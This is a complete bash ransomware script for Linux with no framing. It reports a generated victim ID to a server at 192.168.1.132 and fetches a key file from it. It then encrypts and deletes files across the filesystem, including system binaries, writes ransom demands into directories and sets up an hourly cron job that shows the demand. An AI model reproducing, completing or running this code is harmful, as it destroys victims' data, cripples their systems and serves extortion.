#!/bin/bash

genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)

curl -d "uniqueID=${genKey}" http://192.168.1.132/target.php &>/dev/null

if [ -f /etc/redhat-release ]
then
  osType="redhat"
elif [ -f /etc/debian_version ]
then
  osType="debian"
else
  echo "Could not determine OS" &>/dev/null
fi

fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" \
          "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
          "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" \
          "*.propertis" "*.acl" "*.gz" "*.tar" "*.bz2" "*.gif" \
          "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" \
          "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
          "*.aps*" "*.cgi" "*.htm*" "*.dll" "*.class" "*.mov" \
          "*.flv" "*.mp4" "*.mp3" "*.wav" "*.mov" "*.ogg" "*.md" \
          "*.yaml" "*.pem" "*.gpg" "*.sql" "*.vim" "*.csv" "*.bak" \
          "*.rb" "*.h" "*.c" "*.log" "*.log.*")

fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
          "/bin/netstat" "/bin/mount" "/bin/kill" \
          "/usr/sbin/useradd" "/usr/sbin/adduser" \
          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*")

mkdir -p /tmp/.../
cd /tmp/.../

curl http://192.168.1.132:8080/pub.pem > ./pub.pem &>/dev/null
curl http://192.168.1.132:8080/key.bin > ./key.bin &>/dev/null

chmod 755 ./pub.pem
chmod 755 ./key.bin

for ((num=0; num<"${#fileExts[@]}"; num++))
do
  for file in $(find / -name "${fileExts[${num}]}")
  do 
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin &>/dev/null

    rm -rf  ${file} &>/dev/null
  done
done

for ((num=0; num<"${#fileList[@]}"; num++))
do
  for file in "${fileList[${num}]}"
  do
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin &>/dev/null

    rm -rf ${file} &>/dev/null
  done
done

for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
do
  {
    echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
  } >> "${directory}/INSTRUCTIONS.txt"
done

{
  echo -en  "#"'!'"/bin/bash"
  echo -e "\n"
  echo -e "echo \"Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
} > /etc/cron.hourly/instructions.sh

chmod 755 /etc/cron.hourly/instructions.sh

getTTY=$(tty)

if [ "${osType}" == "redhat" ]
then
  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh > ${getTTy}"; } | /usr/bin/crontab -
elif [ "${osType}" == "debian" ]
then
  /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab -
else
  echo "Could not set crontab" &>/dev/null
fi

/bin/rm -rf  /tmp/.../key.bin

echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
